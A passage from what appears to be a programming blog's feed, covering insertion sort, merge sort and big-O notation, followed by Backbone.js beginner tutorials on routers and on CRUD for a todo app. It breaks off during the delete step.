<p>Do you recognize this algorithm? It‚Äôs called Insertion sort. It has two nested loops, which means that as the number of elements n in the array <code>arr</code> grows it will take approximately n * n longer to perform the sorting. In big-O notation, this will be represented like O(n^2). More on this notation later.</p>
<p>What would happen if the array arr is already sorted? That would be the best-case scenario. The inner for loop will never go through all the elements in the array then (because <code>arr[y-1] &gt; arr[y]</code>  won‚Äôt be met). So the algorithm in run in O(n).</p>
<p>We are not living in an ideal world. So O(n^2) will be probably the average time complexity. Can you think a better way of sorting an array of elements?</p>
<p>Take some minutes to think and come back‚Ä¶</p>
<h2 id="Merge-Sort">Merge Sort<a href="#Merge-Sort" class="headerlink" title="Merge Sort"></a></h2><p>A more efficient algorithm is the Merge sort. It uses the principle of divide and conquer to solve the problem faster. The idea is the follows:</p>
<img src="/images/mergesort.gif">
<ul>
<li>Divide the array in half</li>
<li>Divide the halves by half until 2 or 3 elements are remaining</li>
<li>Sort each of these halves</li>
<li>Merge them back together</li>
</ul>
<p>Can you determine the time complexity of mergesort?</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span>[] helper = <span class="keyword">new</span> <span class="keyword">int</span>[arr.length];</span><br><span class="line">  mergesort(arr, helper, <span class="number">0</span>, arr.length-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mergesort</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span>[] helper, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(low &lt; high)&#123;</span><br><span class="line">    <span class="keyword">int</span> middle = (high+low)/<span class="number">2</span>;</span><br><span class="line">    mergesort(arr, helper, low, middle);</span><br><span class="line">    mergesort(arr, helper, middle+<span class="number">1</span>, high);</span><br><span class="line">    merge(arr, helper, low, middle, high);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span>[] helper, <span class="keyword">int</span> low, <span class="keyword">int</span> middle, <span class="keyword">int</span> high)</span></span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> x=low; x &lt;= high; x++) &#123;</span><br><span class="line">    helper[x] = arr[x];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> left = low;</span><br><span class="line">  <span class="keyword">int</span> curr = low;</span><br><span class="line">  <span class="keyword">int</span> right = middle+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(left &lt;= middle &amp;&amp; right &lt;= high) &#123;</span><br><span class="line">    <span class="keyword">if</span>(helper[right] &gt; helper[left])</span><br><span class="line">      arr[curr++] = helper[left++];</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      arr[curr++] = helper[right++];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(left &lt;= middle)</span><br><span class="line">    arr[curr++] = helper[left++];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Even though the code is much longer, the algorithm is much more efficient.</p>
<img src="/images/insertion_vs_mergsort.png">
<p>It would take some more knowledge to derive the running time mathematically, and we haven‚Äôt covered that yet. However, bear with me, it‚Äôs O(n log(n)). Let‚Äôs sum up:</p>
<p>Algorithm | best | average | worst | space complexity
Insertion Sort | O(n) | O(n^2) | O(n^2) | O(1)
Merge sort | O(n log(n)) | O(n log(n)) | O(n log(n)) | O(n)</p>
<p>Notice that the table has also the space complexity. How much space does the algorithms take is also an important parameter to compare algorithms. The merge sort uses an additional array that‚Äôs way its space complexity is <code>O(n)</code>, however, the insertion sort uses <code>O(1)</code> because it does the sorting in-place.</p>
<h1 id="Big-O-Notation">Big O Notation<a href="#Big-O-Notation" class="headerlink" title="Big O Notation"></a></h1><p>Big O is defined as the asymptotic upper limit of a function. In plain english, it means that is a function that cover the maximum values a function could take. As we saw a little earlier this notation help us to predict performance and compare algorithms.</p>
<table>
<thead>
<tr>
<th>Growth Rate</th>
<th>Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Constant</td>
</tr>
<tr>
<td>log(n)</td>
<td>Logarithmic</td>
</tr>
<tr>
<td>n</td>
<td>Linear</td>
</tr>
<tr>
<td>n log(n)</td>
<td>Linearithmic</td>
</tr>
<tr>
<td>n^2</td>
<td>Quadratic</td>
</tr>
<tr>
<td>n^3</td>
<td>Cubic</td>
</tr>
<tr>
<td>2^n</td>
<td>Exponential</td>
</tr>
</tbody>
</table>
<p>This is kinda abstract let‚Äôs see what it means in code:</p>
<table>
  <tr>
    <th>Growth Rate</th>
    <th>Name</th>
    <th>Code Example</th>
    <th>description</th>
  </tr>
  <tr>
    <td>1</td>
    <td>Constant</td>
    <td><pre>a= b + 1;</pre></td>
    <td>statement (one line of code)</td>
  </tr>
  <tr>
    <td>log(n)</td>
    <td>Logarithmic</td>
    <td>
      <pre>
      while(n&gt;1){
        n=n/2;
      }
      </pre>
    </td>
    <td>Divide in half (binary search)</td>
  </tr>
  <tr>
    <td>n</td>
    <td>Linear</td>
    <td>
      <pre>
for(c=0; c&lt;n; c++){
  a+=1;
}
</pre></td>
    <td>Loop</td>
  </tr>
  <tr>
    <td>n*log(n)</td>
    <td>Linearithmic</td>
    <td>Mergesort, Quicksort, ‚Ä¶</td>
    <td>Effective sorting algorithms</td>
  </tr>
  <tr>
    <td>n^2</td>
    <td>Quadratic</td>
    <td>
      <pre>
for(c=0; c&lt;n; c++){
  for(i=0; i&lt;n; i++){
    a+=1;
  }
}
</pre>
    </td>
    <td>Double loop</td>
  </tr>
  <tr>
    <td>n^3</td>
    <td>Cubic</td>
    <td>
      <pre>
for(c=0; c&lt;n; c++){
  for(i=0; i&lt;n; i++){
    for(x=0; x&lt;n; x++){
      a+=1;
    }
  }
}
</pre>
    </td>
    <td>Triple loop</td>
  </tr>
  <tr>
    <td>2^n</td>
    <td>Exponential</td>
    <td>Trying to braeak a password generating all possible combinations</td>
    <td>Exhaustive search</td>
  </tr>
</table>

<p>That‚Äôs all for this first part 1. I will continue publishing this tutorials every week or so. Stay tune!</p>
<p><hr>
<strong>Update</strong></p>
<p> Checkout out the next post clicking here: <a href="/blog/2018/04/04/how-you-can-change-the-world-learning-data-structures-algorithms-free-online-course-tutorial/">Data Structures and Algorithms (DSA) for Beginners</a></p>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;After being developing software for a while,  I realized that there is a couple of ways to become better at it. One it‚Äôs through your experience: writing code, working on projects, getting hands dirty‚Ä¶ Other one it‚Äôs learning algorithms and design patterns. In other words through leveraging the experience of other computer scientists. Learning to use algorithms efficiently can instantly add to you the equivalent of 10 years of experience or more. Let‚Äôs get started and add new tools to our arsenal!&lt;/p&gt;
    
    </summary>
    
      <category term="Programming" scheme="https://adrianmejia.com/categories/Programming/"/>
    
      <category term="Data Structures and Algorithms (DSA)" scheme="https://adrianmejia.com/categories/Programming/Data-Structures-and-Algorithms-DSA/"/>
    
    
      <category term="big-o notation" scheme="https://adrianmejia.com/tags/big-o-notation/"/>
    
      <category term="algorithms" scheme="https://adrianmejia.com/tags/algorithms/"/>
    
  </entry>
  
  <entry>
    <title>Backbone.js for absolute beginners - getting started (part 4: Routers)</title>
    <link href="https://adrianmejia.com/blog/2012/09/13/backbone-js-for-absolute-beginners-getting-started-part-4/"/>
    <id>https://adrianmejia.com/blog/2012/09/13/backbone-js-for-absolute-beginners-getting-started-part-4/</id>
    <published>2012-09-13T18:41:00.000Z</published>
    <updated>2012-09-13T18:41:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>This tutorial is about BackboneJS Routes.</p>
<a id="more"></a>
<p>BackboneJS Tutorial series:</p>
<ol>
<li><a href="/blog/2012/09/11/backbone-dot-js-for-absolute-beginners-getting-started/">Backbone.js for Absolute Beginners - Getting started (Part 1: Intro)</a></li>
<li><a href="/blog/2012/09/13/backbone-js-for-absolute-beginners-getting-started-part-2/">Backbone.js for absolute beginners - getting started (part 2: Models, Collections and Views)</a></li>
<li><a href="/blog/2012/09/13/backbonejs-for-absolute-beginners-getting-started-part-3/">Backbone.js for absolute beginners - getting started (part 3: CRUD)</a></li>
<li>Backbone.js for absolute beginners - getting started (part 4: Routers) <strong>üëà you are here</strong></li>
</ol>
<h1 id="Backbone-Router">Backbone.Router<a href="#Backbone-Router" class="headerlink" title="Backbone.Router"></a></h1><p>You could build web application without using the routers.  However, if you want to make reference to certain ‚Äòstate‚Äô or location of the web application, you need a reference (link/URL) to it. This is where routers come to rescue.</p>
<p>Routing in most of JS application are achieved by hash-tags. E.g. If you take a look of Gmail URL you will see something like:</p>
<p><code>https://mail.google.com/mail/u/0/#inbox/139c0d48e11d986b</code></p>
<p>where the <code>#inbox/139c0d48e11d986b</code> is the hash-tag which reference some email location.</p>
<p>In backbone, routes are hash maps that match URL patterns to functions. You can use parameter parts, such as <code>todos/:id</code>, or using splats <code>file/*path</code> you will match all the parameters from the splat on. For that reason, the splat parameter should be always the last matcher.</p>
<h2 id="Initializing-the-Router">Initializing the Router<a href="#Initializing-the-Router" class="headerlink" title="Initializing the Router"></a></h2><p>In our Todo app, we are going to use routers to filter between the tasks that are pending and the ones that have been completed. So, let‚Äôs initialize the routes this way:</p>
<figure class="highlight js"><figcaption><span>Define Router</span><a href="https://raw.github.com/amejiarosario/Backbone-tutorial/327ac4fc4657e73fdf7157e230b1ed7cd1519667/backbone-tutorial.html" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">app.Router = Backbone.Router.extend(&#123;</span><br><span class="line">  routes: &#123;</span><br><span class="line">    <span class="string">'*filter'</span> : <span class="string">'setFilter'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  setFilter: <span class="function"><span class="keyword">function</span>(<span class="params">params</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'app.router.params = '</span> + params); <span class="comment">// just for didactical purposes.</span></span><br><span class="line">    <span class="built_in">window</span>.filter = params.trim() || <span class="string">''</span>;</span><br><span class="line">    app.todoList.trigger(<span class="string">'reset'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Now, you need to initialize it, adding this lines:</p>
<figure class="highlight diff"><figcaption><span>Initialize router</span><a href="https://raw.github.com/amejiarosario/Backbone-tutorial/327ac4fc4657e73fdf7157e230b1ed7cd1519667/backbone-tutorial.html" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">     //--------------</span><br><span class="line">     // Initializers</span><br><span class="line">     //--------------</span><br><span class="line"></span><br><span class="line"><span class="addition">+    app.router = new app.Router();</span></span><br><span class="line"><span class="addition">+    Backbone.history.start();</span></span><br><span class="line">     app.appView = new app.AppView();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>You can test that you router is working just typing <code>#anything/that/you/want</code> and seeing the parameter in you browser‚Äôs console.</p>
<h2 id="2-6-1-Processing-the-routes">2.6.1 Processing the routes<a href="#2-6-1-Processing-the-routes" class="headerlink" title="2.6.1 Processing the routes"></a></h2><p>Before rendering the list of items, you need to check the parameters to wether show only the pending ones, or the completed or show them all. As shown in the code snipet below.</p>
<figure class="highlight diff"><figcaption><span>Processing the routes in app.AppView</span><a href="https://raw.github.com/amejiarosario/Backbone-tutorial/327ac4fc4657e73fdf7157e230b1ed7cd1519667/backbone-tutorial.html" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@@ -164,7 +177,18 @@</span></span><br><span class="line">       &#125;,</span><br><span class="line">       addAll: function()&#123;</span><br><span class="line">         this.$('#todo-list').html(''); // clean the todo list</span><br><span class="line"><span class="deletion">-        app.todoList.each(this.addOne, this);</span></span><br><span class="line"><span class="addition">+        // filter todo item list</span></span><br><span class="line"><span class="addition">+        switch(window.filter)&#123;</span></span><br><span class="line"><span class="addition">+          case 'pending':</span></span><br><span class="line"><span class="addition">+            _.each(app.todoList.remaining(), this.addOne);</span></span><br><span class="line"><span class="addition">+            break;</span></span><br><span class="line"><span class="addition">+          case 'completed':</span></span><br><span class="line"><span class="addition">+            _.each(app.todoList.completed(), this.addOne);</span></span><br><span class="line"><span class="addition">+            break;</span></span><br><span class="line"><span class="addition">+          default:</span></span><br><span class="line"><span class="addition">+            app.todoList.each(this.addOne, this);</span></span><br><span class="line"><span class="addition">+            break;</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line">       &#125;,</span><br><span class="line">       newAttributes: function()&#123;</span><br><span class="line">         return &#123;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>If you try adding the words <code>#/pending</code> or <code>#/completed</code> at the end of the URL you‚Äôll get an error!. That‚Äôs a good sign, it means the routes are working, but we haven‚Äôt implemented the <code>app.todoList.remaining()</code> and <code>app.todoList.completed()</code>. So, that‚Äôs next:</p>
<figure class="highlight diff"><figcaption><span>Defining completed and remaining functions in app.TodoList</span><a href="https://raw.github.com/amejiarosario/Backbone-tutorial/327ac4fc4657e73fdf7157e230b1ed7cd1519667/backbone-tutorial.html" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@@ -85,7 +90,15 @@</span></span><br><span class="line">     //--------------</span><br><span class="line">     app.TodoList = Backbone.Collection.extend(&#123;</span><br><span class="line">       model: app.Todo,</span><br><span class="line"><span class="deletion">-      localStorage: new Store("backbone-todo")</span></span><br><span class="line"><span class="addition">+      localStorage: new Store("backbone-todo"),</span></span><br><span class="line"><span class="addition">+      completed: function() &#123;</span></span><br><span class="line"><span class="addition">+        return this.filter(function( todo ) &#123;</span></span><br><span class="line"><span class="addition">+          return todo.get('completed');</span></span><br><span class="line"><span class="addition">+        &#125;);</span></span><br><span class="line"><span class="addition">+      &#125;,</span></span><br><span class="line"><span class="addition">+      remaining: function() &#123;</span></span><br><span class="line"><span class="addition">+        return this.without.apply( this, this.completed() );</span></span><br><span class="line"><span class="addition">+      &#125;</span></span><br><span class="line">     &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Now, if you try again adding the hash-tags it will work! But, it will be better if the user can have links to that instead of typing URLs. So, let‚Äôs add them.</p>
<figure class="highlight diff"><figcaption><span>Show routes' links</span><a href="https://raw.github.com/amejiarosario/Backbone-tutorial/327ac4fc4657e73fdf7157e230b1ed7cd1519667/backbone-tutorial.html" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@@ -32,6 +32,11 @@</span></span><br><span class="line">     &lt;header id="header"&gt;</span><br><span class="line">       &lt;h1&gt;Todos&lt;/h1&gt;</span><br><span class="line">       &lt;input id="new-todo" placeholder="What needs to be done?" autofocus&gt;</span><br><span class="line"><span class="addition">+      &lt;div&gt;</span></span><br><span class="line"><span class="addition">+        &lt;a href="#/"&gt;show all&lt;/a&gt; |</span></span><br><span class="line"><span class="addition">+        &lt;a href="#/pending"&gt;show pending&lt;/a&gt; |</span></span><br><span class="line"><span class="addition">+        &lt;a href="#/completed"&gt;show completed&lt;/a&gt;</span></span><br><span class="line"><span class="addition">+      &lt;/div&gt;</span></span><br><span class="line">     &lt;/header&gt;</span><br><span class="line">     &lt;section id="main"&gt;</span><br><span class="line">       &lt;ul id="todo-list"&gt;&lt;/ul&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Well, that‚Äôs all! If completed these 4 parts tutorial you will be familiar with the main Backbone modules (Models, Collections, Views, Events, and Routes). To increase you knowledge you can follow the following resources:</p>
<ul>
<li><a href="https://github.com/documentcloud/backbone/blob/master/backbone.js" target="_blank" rel="noopener">Backbone‚Äôs Source code - it‚Äôs the ultimate source of true</a></li>
<li><a href="http://backbonejs.org/?utm_source=adrianmejia.com" target="_blank" rel="noopener">Official documentation</a></li>
</ul>
<h1 id="What‚Äôs-next">What‚Äôs next?<a href="#What‚Äôs-next" class="headerlink" title="What‚Äôs next?"></a></h1><p>Write a server API in NodeJS to apply the learned here:</p>
<ul>
<li><a href="/blog/2014/10/01/creating-a-restful-api-tutorial-with-nodejs-and-mongodb/" target="_blank">Creating a RESTful API with NodeJS and MongoDB</a></li>
</ul>
<p>Now, do a Todo app in AngularJS:</p>
<ul>
<li><a href="/blog/2014/09/28/angularjs-tutorial-for-beginners-with-nodejs-expressjs-and-mongodb/" target="_blank">AngularJS tutorial for beginners with NodeJS ExpressJS and MongoDB</a></li>
</ul>
<p>Hope it was helpful!</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;This tutorial is about BackboneJS Routes.&lt;/p&gt;
    
    </summary>
    
      <category term="Technologies" scheme="https://adrianmejia.com/categories/Technologies/"/>
    
      <category term="Web Development" scheme="https://adrianmejia.com/categories/Technologies/Web-Development/"/>
    
    
      <category term="javascript" scheme="https://adrianmejia.com/tags/javascript/"/>
    
      <category term="backbonejs" scheme="https://adrianmejia.com/tags/backbonejs/"/>
    
      <category term="tutorial_backbonejs" scheme="https://adrianmejia.com/tags/tutorial-backbonejs/"/>
    
  </entry>
  
  <entry>
    <title>Backbone.js for absolute beginners - getting started (part 3: CRUD)</title>
    <link href="https://adrianmejia.com/blog/2012/09/13/backbonejs-for-absolute-beginners-getting-started-part-3/"/>
    <id>https://adrianmejia.com/blog/2012/09/13/backbonejs-for-absolute-beginners-getting-started-part-3/</id>
    <published>2012-09-13T05:37:00.000Z</published>
    <updated>2012-09-13T05:37:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>In tutorial we are going to continue learning about BackboneJS: CRUD.</p>
<a id="more"></a>
<p>BackboneJS Tutorial series:</p>
<ol>
<li><a href="/blog/2012/09/11/backbone-dot-js-for-absolute-beginners-getting-started/">Backbone.js for Absolute Beginners - Getting started (Part 1: Intro)</a></li>
<li><a href="/blog/2012/09/13/backbone-js-for-absolute-beginners-getting-started-part-2/">Backbone.js for absolute beginners - getting started (part 2: Models, Collections and Views)</a></li>
<li>Backbone.js for absolute beginners - getting started (part 3: CRUD) <strong>üëà you are here</strong></li>
<li><a href="/blog/2012/09/13/backbone-js-for-absolute-beginners-getting-started-part-4/">Backbone.js for absolute beginners - getting started (part 4: Routers)</a></li>
</ol>
<h1 id="Todo-item-list-CRUD">Todo item list CRUD<a href="#Todo-item-list-CRUD" class="headerlink" title="Todo item list CRUD"></a></h1><p>There are a couple of features that we could improve. Let‚Äôs implement the CRUD (Create-Read-Update-Delete) for the item list.</p>
<h2 id="C-reate">C-reate<a href="#C-reate" class="headerlink" title="C-reate"></a></h2><p>We are already can create item list from the console (2.3) and also from the UI (2.4.3). So, it‚Äôs done.</p>
<h2 id="U-pdate">U-pdate<a href="#U-pdate" class="headerlink" title="U-pdate"></a></h2><p>What if you make a mistake and want to change the text on some of your to-do list. Furthermore, you can notice that the checkboxes states are not persistent when you reload the pages. Let‚Äôs fix both problems.</p>
<p>1.-    You want to respond to a double click event showing up a text box, where the user can change the text. First, let‚Äôs add the HTML in the <code>item-template</code> template below the label tag.</p>
<p><code>&lt;input class=&quot;edit&quot; value=&quot;&lt;%- title %&gt;&quot;&gt;</code></p>
<p>2.- If you refresh, you will notice that there are both displaying at the same time. So, you can hide them properly with the following CSS.
<figure class="highlight css"><figcaption><span>CSS</span><a href="https://raw.github.com/amejiarosario/Backbone-tutorial/3840dc802d6f311528298639150a5f52364c1975/backbone-tutorial.html" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="selector-id">#todo-list</span> <span class="selector-tag">input</span><span class="selector-class">.edit</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: none; <span class="comment">/* Hides input box*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#todo-list</span> <span class="selector-class">.editing</span> <span class="selector-tag">label</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: none; <span class="comment">/* Hides label text when .editing*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#todo-list</span> <span class="selector-class">.editing</span> <span class="selector-tag">input</span><span class="selector-class">.edit</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline; <span class="comment">/* Shows input text box when .editing*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>3.- Then, we need to add the events to the TodoView class to respond to the changes.</p>
<figure class="highlight js"><figcaption><span>Todo Model</span><a href="https://raw.github.com/amejiarosario/Backbone-tutorial/3840dc802d6f311528298639150a5f52364c1975/backbone-tutorial.html" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// renders individual todo items list (li)</span></span><br><span class="line">app.TodoView = Backbone.View.extend(&#123;</span><br><span class="line">  tagName: <span class="string">'li'</span>,</span><br><span class="line">  template: _.template($(<span class="string">'#item-template'</span>).html()),</span><br><span class="line">  render: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.$el.html(<span class="keyword">this</span>.template(<span class="keyword">this</span>.model.toJSON()));</span><br><span class="line">    <span class="keyword">this</span>.input = <span class="keyword">this</span>.$(<span class="string">'.edit'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>; <span class="comment">// enable chained calls</span></span><br><span class="line">  &#125;,</span><br><span class="line">  initialize: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.model.on(<span class="string">'change'</span>, <span class="keyword">this</span>.render, <span class="keyword">this</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  events: &#123;</span><br><span class="line">    <span class="string">'dblclick label'</span> : <span class="string">'edit'</span>,</span><br><span class="line">    <span class="string">'keypress .edit'</span> : <span class="string">'updateOnEnter'</span>,</span><br><span class="line">    <span class="string">'blur .edit'</span> : <span class="string">'close'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  edit: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.$el.addClass(<span class="string">'editing'</span>);</span><br><span class="line">    <span class="keyword">this</span>.input.focus();</span><br><span class="line">  &#125;,</span><br><span class="line">  close: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> value = <span class="keyword">this</span>.input.val().trim();</span><br><span class="line">    <span class="keyword">if</span>(value) &#123;</span><br><span class="line">      <span class="keyword">this</span>.model.save(&#123;<span class="attr">title</span>: value&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.$el.removeClass(<span class="string">'editing'</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  updateOnEnter: <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(e.which == <span class="number">13</span>)&#123;</span><br><span class="line">      <span class="keyword">this</span>.close();</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>You can find the <a href="https://github.com/amejiarosario/Backbone-tutorial/commit/3840dc802d6f311528298639150a5f52364c1975" target="_blank" rel="noopener">diff</a> that were added to implement the update feature.</p>
<p><a href="https://github.com/amejiarosario/Backbone-tutorial/commit/19fa69e654ae5d370385675e4ffed615532b9934" target="_blank" rel="noopener">Here</a> are the changes to fix the update for the checkboxes.</p>
<h2 id="D-elete">D-elete<a href="#D-elete" class="headerlink" title="D-elete"></a></h2><p>To be able to remove to-do items, we need to add a remove button in each item and listen to the click event on it, which will trigger the destroy function in the selected todo object.</p>
<p>1.- Add the HTML markup for the remove button.</p>
<figure class="highlight diff"><figcaption><span>Remove Button into item template</span><a href="https://raw.github.com/amejiarosario/Backbone-tutorial/1267e531ae3ef508eb32e5308c2cc965f02d1b45/backbone-tutorial.html" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@@ -47,6 +47,7 @@</span></span><br><span class="line">       &lt;input class="toggle" type="checkbox" &lt;%= completed ? 'checked' : '' %&gt;&gt;</span><br><span class="line">       &lt;label&gt;&lt;%- title %&gt;&lt;/label&gt;</span><br><span class="line">       &lt;input class="edit" value="&lt;%- title %&gt;"&gt;</span><br><span class="line"><span class="addition">+      &lt;button class="destroy"&gt;remove&lt;/button&gt;</span></span><br><span class="line">     &lt;/div&gt;</span><br><span class="line">   &lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>2.- Listen for the click event in the button that you just created.</p>
